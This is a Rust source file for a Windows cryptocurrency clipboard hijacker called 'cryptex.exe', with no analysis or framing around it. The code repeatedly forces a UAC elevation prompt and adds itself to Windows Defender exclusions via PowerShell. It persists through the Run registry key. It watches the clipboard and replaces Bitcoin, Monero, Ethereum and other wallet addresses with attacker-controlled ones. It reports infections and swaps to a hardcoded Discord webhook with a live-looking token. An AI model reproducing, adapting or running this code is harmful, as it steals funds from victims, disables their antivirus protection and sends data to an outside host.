// #![windows_subsystem = "windows"]

use clipboard::{windows_clipboard::WindowsClipboardContext, ClipboardProvider};
use regex::Regex;
use std::io::Error;
use std::process::ExitStatus;
use std::{
    collections::HashMap,
    env,
    ffi::OsStr,
    fs::{copy, create_dir_all},
    io,
    ops::Deref,
    os::windows::{prelude::OsStrExt, raw::HANDLE},
    path::PathBuf,
    process::Command,
    ptr::null_mut,
    str::FromStr,
    thread,
    time::Duration,
};
use winapi::um::{
    synchapi::{CreateMutexW, OpenMutexW},
    winnt::SYNCHRONIZE,
};
use winreg::{enums::*, RegKey};

static WEBHOOK: &str = "https://discord.com/api/webhooks/1103006398784212992/50iC4B_EO-wOFggTNnSXi4AXzawaObUmK9LzoNfalQbB6_Xw0T0kRTX2hdeXZLzaDRDf";
static FILE_NAME: &str = "cryptex.exe";
static MUTEX: &str = "kf3klj43n3cnh";
static FOLDER_NAME: &str = "sdsdfsdsfd";

const BTC_ADDR: &str = "h";
const XMR_ADDR: &str = "dfssdf";
const DGE_ADDR: &str = "dfssfd";
const LTC_ADDR: &str = "dsfsdf";
const ETH_ADDR: &str = "dfgdg";
const BCH_ADDR: &str = "ghgfh";

fn add_to_startup_registry(path: String) -> io::Result<()> {
    let sub_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

    let key = RegKey::predef(HKEY_CURRENT_USER).open_subkey_with_flags(sub_key, KEY_WRITE)?;

    key.set_value(FILE_NAME, &path)
}

fn file_exists(file_path: &PathBuf) -> bool {
    file_path.exists() && file_path.is_file()
}

fn get_destination_path() -> (PathBuf, PathBuf) {
    let desired_path = PathBuf::from(env::var("LOCALAPPDATA").unwrap()).join(FOLDER_NAME);

    (
        desired_path.join(format!("{}.exe", FILE_NAME)),
        desired_path,
    )
}

async fn persistence() -> io::Result<()> {
    let current_path = env::current_exe()?;

    let (file_path, folder_path) = get_destination_path();

    match add_to_startup_registry(file_path.to_str().unwrap().to_string()) {
        Ok(..) => {
            if !file_exists(&file_path) {
                create_dir_all(&folder_path)?;
                copy(current_path, file_path)?;

                send_webhook("New client detected".to_string()).await;
            }
        }
        Err(..) => {}
    };

    Ok(())
}

fn scan(check_map: &HashMap<&str, &str>) -> Option<(String, String)> {
    let mut cb_prov = <WindowsClipboardContext as ClipboardProvider>::new().unwrap();

    let result = cb_prov.get_contents();

    let mut check_set_contents = |check: &str, set: &str, clipoard_text: String| -> Option<bool> {
        if Regex::from_str(check).unwrap().is_match(&clipoard_text) {
            if let Ok(..) = cb_prov.set_contents(
                Regex::from_str(check)
                    .unwrap()
                    .replace(&clipoard_text, set)
                    .to_string(),
            ) {
                return Some(true);
            }
        }

        return None;
    };

    if let Ok(clipboard_text) = result {
        for (regex_str, address) in check_map {
            if check_set_contents(regex_str, address, clipboard_text.clone()).is_some() {
                return Some((
                    String::from(regex_str.deref()),
                    String::from(address.deref()),
                ));
            }
        }
    }

    return None;
}

#[allow(unused_must_use)]
async fn send_webhook(content: String) -> () {
    let client = reqwest::Client::new();
    let payload = format!(r#"{{ "content": "{}" }}"#, content);

    client
        .post(WEBHOOK)
        .header("Content-Type", "application/json")
        .body(payload)
        .send()
        .await;
}

fn check_mutex() -> bool {
    let mutex_name: Vec<u16> = OsStr::new(MUTEX)
        .encode_wide()
        .chain(Some(0).into_iter())
        .collect();

    let handle: HANDLE = unsafe { OpenMutexW(SYNCHRONIZE, 0, mutex_name.as_ptr()) };

    if handle.is_null() {
        let new_handle: HANDLE = unsafe { CreateMutexW(null_mut(), 0, mutex_name.as_ptr()) };

        if new_handle.is_null() {
            return false;
        }
    } else {
        return false;
    }

    true
}

fn is_administrator() -> Result<bool, Error> {
    use std::mem;
    use winapi::shared::minwindef::DWORD;
    use winapi::um::processthreadsapi::OpenProcessToken;
    use winapi::um::securitybaseapi::GetTokenInformation;
    use winapi::um::winnt::{TokenElevation, HANDLE, TOKEN_ELEVATION, TOKEN_QUERY};

    let token: HANDLE = null_mut();
    let process_handle = unsafe { winapi::um::processthreadsapi::GetCurrentProcess() };
    let success =
        unsafe { OpenProcessToken(process_handle, TOKEN_QUERY, &token as *const _ as *mut _) } != 0;

    if !success {
        return Err(Error::last_os_error());
    }

    let mut elevation: TOKEN_ELEVATION = unsafe { mem::zeroed() };
    let mut ret_len: DWORD = 0;

    let success = unsafe {
        GetTokenInformation(
            token,
            TokenElevation,
            &mut elevation as *mut _ as *mut _,
            mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut ret_len as *mut _,
        ) != 0
    };

    if !success {
        return Err(Error::last_os_error());
    }

    Ok(elevation.TokenIsElevated != 0)
}

fn add_to_defender_exclusions(path: &str) -> () {
    Command::new("powershell")
        .args(&[
            "-Command",
            &format!("Add-MpPreference -ExclusionPath '{}'", path),
        ])
        .output()
        .expect("Failed to execute command.");
}

fn run_as_admin() -> ExitStatus {
    let status = Command::new("powershell")
        .args(&[
            "-ExecutionPolicy",
            "Bypass",
            "-NoProfile",
            "-Command",
            &format!(
                "Start-Process -FilePath \"{}\" -Verb RunAs",
                std::env::current_exe().unwrap().to_str().unwrap()
            ),
        ])
        .status()
        .expect("Failed to execute command");

    status
}

#[tokio::main]
async fn main() {
    if is_administrator().unwrap() {
        if check_mutex() {
            add_to_defender_exclusions(
                std::env::current_exe()
                    .unwrap()
                    .to_str()
                    .unwrap()
            );  

            add_to_defender_exclusions(
                get_destination_path()
                    .0
                    .to_str()
                    .unwrap()
            );
            
            let map: HashMap<&str, &str> = HashMap::from_iter([
                (
                    r"^(1|3)[1-9A-HJ-NP-Za-km-z]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$",
                    BTC_ADDR,
                ),
                (r"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", XMR_ADDR),
                (r"^[LM3][1-9A-HJ-NP-Za-km-z]{26,33}$", LTC_ADDR),
                (r"^(0x)[a-fA-F0-9]{40,128}$", ETH_ADDR),
                (r"^D[1-9A-HJ-NP-Za-km-z]{33}$", DGE_ADDR),
                (r"^(q|1|bitcoincash:)[a-zA-HJ-NP-Z0-9]{41}$", BCH_ADDR),
            ]);

            match persistence().await {
                Ok(..) => loop {
                    let scan_res = scan(&map);

                    if scan_res.is_some() {
                        send_webhook("Copied to clipboard".to_string()).await;
                    }

                    thread::sleep(Duration::from_millis(500));
                },
                Err(..) => {}
            };
        }
    } else {
        loop {
            let status = run_as_admin();

            if status.success() {
                break;
            };
        }
    }
}
